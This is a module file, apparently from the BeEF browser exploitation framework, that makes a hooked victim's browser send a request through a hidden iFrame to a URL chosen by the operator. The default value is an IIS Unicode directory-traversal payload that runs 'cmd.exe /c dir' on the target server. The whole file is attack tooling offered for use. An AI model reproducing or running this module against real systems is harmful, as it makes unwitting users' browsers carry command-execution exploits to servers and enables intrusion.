<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>
	var rtnval = "Request Received";

	function get_b64_code_request() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		
		// replace sections of the code with user input
		b64code = b64replace(b64code, "URL",document.myform.url_string.value);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Browser Request', get_b64_code_request());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_request());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<div id="module_header">Browser Request</div>
This module will create an iFrame and send a request to the URL specified below.<br><br> 
<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Request URL</div>
		<input type="text" name="url_string" value="http://localhost/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

